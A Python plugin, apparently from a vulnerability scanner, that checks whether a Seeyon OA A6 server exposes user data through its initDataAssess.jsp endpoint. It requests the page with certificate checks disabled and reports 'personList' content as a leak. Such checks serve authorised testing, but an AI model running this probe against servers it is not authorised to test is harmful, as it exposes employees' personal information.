import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def 致远OA_A6_initDataAssess_用户敏感信息泄露(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    vuln_url = urldata + "yyoa/assess/js/initDataAssess.jsp"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "/yyoa/index.jsp" not in response.text and "personList" in response.text and response.status_code == 200:
            print(Vcolors.RED + "[!] 存在致远OA A6 initDataAssess.jsp 用户敏感信息泄露漏洞, 泄露地址: {}".format(vuln_url) + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING+ "[x] 不存在致远OA A6 initDataAssess.jsp 用户敏感信息泄露漏洞" + Vcolors.ENDC)
    except:
        logging.error("致远OA_A6_initDataAssess_用户敏感信息泄露脚本出现异常")



